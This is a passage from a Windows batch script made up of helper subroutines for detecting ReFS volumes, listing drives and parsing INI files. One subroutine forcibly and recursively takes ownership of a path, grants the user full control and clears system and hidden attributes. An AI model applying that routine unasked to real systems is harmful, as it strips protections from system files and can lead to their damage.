	>nul 2>nul fsutil fsinfo refsinfo %1&&(
		exit /b 1
	)
	exit /b 0
)
goto :eof
:wjqx
if exist "!windir!\system32\takeown.exe" (takeown /r /d y /skipsl /f "%~1")
echo;y|cacls "%~1" /t /c /g %username%:f
attrib -s -h -r "%~1"
goto :eof
:sypf
if "%1" equ "" (goto :eof)
if exist "!windir!\System32\fsutil.exe" (
	for /f "tokens=1*" %%a in ('fsutil fsinfo drives') do (
		set "%1=%%b"
		goto :eof
	)
)
for %%a in (
	a b c d e
	f g h i j
	k l m n o
	p q r s t
	u v w x y z
) do (
	if exist "%%a:\" (set "%1=!%1!%%a:\ ")
)
goto :eof
:ini
>nul 2>nul dir /a:d /b "%~1"&&goto :eof
if not exist "%~1" (goto :eof)
if "%~2" equ "" (goto :eof)
set %~2=
if "%~3" equ "" (
	for /f "usebackq eol=# delims=" %%a in ("%~1") do (
		set "__line=%%a"
		if "!__line:~0,1!!__line:~-1!" neq "[]" (
			if "!__line:~0,1!" neq ";" (
				set /a "%~2+=1"
				set "%~2!%~2!=%%a"
			)
		)
	)
	set __line=
	goto :eof
)
set "__section=[%~3]"
set __start=
for /f "usebackq eol=# delims=" %%a in ("%~1") do (
	if /i "%%a" equ "!__section!" (
		set __start=1
		set __section=
	) else (
		if "!__start!" equ "1" (
			set "__line=%%a"
			if "!__line:~0,1!!__line:~-1!" equ "[]" (
				set __line=
				set __start=
				goto :eof
			)
			if "!__line:~0,1!" neq ";" (
				if "%~4" equ "" (
					set /a "%~2+=1"
					set "%~2!%~2!=%%a"
				) else (
					for /f "tokens=1* delims== " %%a in ("%%a") do (
						if /i "%%a" equ "%~4" (
							set /a "%~2+=1"
							set "%~2!%~2!=%%a=%%b"
						)
					)
				)
			)
		)
	)
)
set __line=
set __start=
goto :eof
:winnt
@echo;Incompatible with the current system operating environment